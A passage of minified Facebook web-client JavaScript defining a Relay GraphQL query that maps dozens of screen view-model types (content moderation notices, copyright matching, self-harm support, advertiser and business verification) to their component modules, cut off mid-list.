/*FB_PKG_DELIM*/

__d(
    "CometActorGatewayHandlerQuery.graphql",
    ["relay-runtime"],
    function (a, b, c, d, e, f) {
      "use strict";
      a = (function () {
        var a = [{ defaultValue: null, kind: "LocalArgument", name: "scale" }],
          b = {
            alias: null,
            args: null,
            kind: "ScalarField",
            name: "presentation_style",
            storageKey: null,
          },
          c = [{ kind: "Literal", name: "supported", value: "4vG8Rw" }],
          d = {
            alias: null,
            args: null,
            kind: "ScalarField",
            name: "__typename",
            storageKey: null,
          },
          e = {
            alias: null,
            args: null,
            kind: "ScalarField",
            name: "id",
            storageKey: null,
          },
          f = {
            alias: null,
            args: null,
            concreteType: null,
            kind: "LinkedField",
            name: "screen",
            plural: !1,
            selections: [
              d,
              {
                kind: "TypeDiscriminator",
                abstractKey: "__isCIXScreenViewModel",
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "AFXAboutOurDecisionCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXAboutOurDecisionScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "AFXBlackholeCommunityStandardDetailsCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXBlackholeCommunityStandardDetailsScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "AFXBlackholeCommunityStandardCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXBlackholeCommunityStandardScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "AFXBlackholeFeedbackOptionsCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXBlackholeFeedbackOptionsScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "AFXBlackholeInitialCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXBlackholeInitialScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "AFXBypassLoginInterstitialCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXBypassLoginInterstitialScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "AFXCommunityStandardsCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXCommunityStandardsScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "AFXConfirmFeedbackOptionCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXConfirmFeedbackOptionScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometAFXCopyrightMatchAboutScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXCopyrightMatchAboutScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometAFXCopyrightMatchActionDetailScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXCopyrightMatchActionDetailScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometAFXCopyrightMatchConfirmOptionScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXCopyrightMatchConfirmOptionScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometAFXCopyrightMatchFeedbackOptionsScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXCopyrightMatchFeedbackOptionsScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometAFXCopyrightMatchFollowUpScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXCopyrightMatchFollowUpScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometAFXCopyrightMatchFormScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXCopyrightMatchFormScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometAFXCopyrightMatchOverviewScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXCopyrightMatchOverviewScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometAFXCopyrightMatchPolicyScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXCopyrightMatchPolicyScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometAFXCopyrightMatchSegmentSelectorScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXCopyrightMatchSegmentSelectorScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "AFXExampleCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXExampleScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "AFXFeedbackFollowUpCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXFeedbackFollowUpScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "AFXFeedbackOptionsCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXFeedbackOptionsScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "AFXHeadsUpCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXHeadsUpScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "AFXIntegrityErrorComplexDialogCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXIntegrityErrorComplexDialogScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "AFXIntegrityErrorDefaultExperienceCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXIntegrityErrorDefaultExperienceScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "AFXIntegrityErrorFLXViolationsHistoryDialogCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXIntegrityErrorFLXViolationsHistoryDialogScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "AFXItemOverviewCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXItemOverviewScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "AFXMultipleItemsOverviewCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXMultipleItemsOverviewScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "AFXNonTessaSurveyCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXNonTessaSurveyScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "AFXOBInvitedToShareInfoCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXOBInvitedToShareInfoScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "AFXObFbrcGatewayNoticeCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXObFbrcGatewayNoticeScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "AFXObFbrcShareContextCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXObFbrcShareContextScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometAFXProfilePlusAdminlessTransitionCPNScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXProfilePlusAdminlessTransitionCPNScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometAFXProfilePlusBizAdminOnboardingAcceptAccessScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXProfilePlusBizAdminOnboardingAcceptAccessScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometAFXProfilePlusBizAdminOnboardingReviewAccessScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXProfilePlusBizAdminOnboardingReviewAccessScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "AFXRateLimitExperienceCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXRateLimitExperienceScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "AFXSelfHarmPromotionCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXSelfHarmPromotionScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "AFXSentryAfterDecisionCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXSentryAfterDecisionScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "AFXSentryRestrictionCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXSentryRestrictionScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "AFXStaticContentCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXStaticContentScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "AFXSuicidalAdmissionHomeCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXSuicidalAdmissionHomeScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "AFXSuicidalPromotionCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXSuicidalPromotionScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "AFXUserWarningCometScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AFXUserWarningScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometAdvertiserAuthenticityConfirmPhoneNumberIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AdvertiserAuthenticityConfirmPhoneNumberScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometAdvertiserAuthenticityEmailChallengeIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AdvertiserAuthenticityEmailChallengeScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometAdvertiserAuthenticityEnterEmailCodeIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AdvertiserAuthenticityEnterEmailCodeScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometAdvertiserAuthenticityEnterPhoneCodeIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AdvertiserAuthenticityEnterPhoneCodeScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometAdvertiserAuthenticityPageAdminNameDetailsScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AdvertiserAuthenticityPageAdminNameDetailsScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometAdvertiserAuthenticitySelectDomainScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "AdvertiserAuthenticitySelectDomainScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometBAPRequestHandlerEmptyScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BAPWizardRequestHandlerScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometBVWizardAdvertiserVerificationEnterCodeIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardAdvertiserVerificationEnterCodeIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometBVWizardAdvertiserVerificationEnterPhoneIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardAdvertiserVerificationEnterPhoneIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometBVWizardAdvertiserVerificationPhoneVerificationInformationIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardAdvertiserVerificationPhoneVerificationInformationIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometBVWizardAdvertiserVerificationSharingIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardAdvertiserVerificationSharingIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometBVWizardBankVerificationEnterAmountScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardBankVerificationEnterAmountIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometBVWizardBankVerificationOverviewScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardBankVerificationOverviewIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometBVWizardBusinessDetailsPrimaryIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardBusinessDetailsPrimaryIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometBVWizardConfigSelectionIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardConfigSelectionIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometBVWizardConfirmAuthVendorRecordIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardConfirmAuthVendorRecordIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometBVWizardConfirmBusinessIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardConfirmBusinessIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometBVWizardConfirmStakeholderIdentityIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBBVWizardConfirmStakeholderIdentityIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometBVWizardCountrySelectionIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardCountrySelectionIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometBVWizardCustomerServiceEmailEnterCodeIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardCustomerServiceEmailEnterCodeIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometBVWizardCustomerServicePhoneEnterCodeScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardCustomerServicePhoneEnterCodeScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometBVWizardDomainVerificationAdditionalRequirementsIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBBVWizardDomainVerificationAdditionalRequirementsScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometBVWizardHowToSelectYourOrganizationIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardHowToSelectYourOrganizationScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometBVWizardHowWeUseYourInfoIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardHowWeUseYourInfoScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometBVWizardIDVNameInputIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardIDVNameInputIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometBVWizardIDVSelectIDTypeIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardIDVSelectIDTypeIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometBVWizardIDVUploadIDIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardIDVUploadIDIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometBVWizardManualFlowOverviewIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardManualFlowOverviewIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometBVWizardOutroIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardOutroIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometBVWizardOverviewIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardOverviewIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometBVWizardPreemptiveNMIIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardPreemptiveNMIIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometBVWizardPublicRecordNotFoundIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBBVWizardPublicRecordNotFoundIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometBVWizardSelectAuthVendorRecordIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardSelectAuthVendorRecordIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometBVWizardSelectBusinessIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardSelectBusinessIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometBVWizardSellerSelectSupportPhoneNumberChallengeMethodIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardSelectSupportPhoneNumberChallengeMethodScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometBVWizardSellerCertificationIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardSellerCertificationIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometBVWizardSellerCollectCustomerSupportPhoneNumberIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardSellerCollectCustomerSupportPhoneNumberIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometBVWizardSellerCompletionIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardSellerCompletionIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometBVWizardSellerPublicAddressIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardSellerPublicAddressIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometBVWizardSellerSupportEmailCollectionIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardSellerSupportEmailCollectionIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometBVWizardTaxIdIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardTaxIdIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometBVWizardVerificationFailedErrorIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardVerificationFailedErrorIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometBVWizardVerifyYourBankIXTScreen_data",
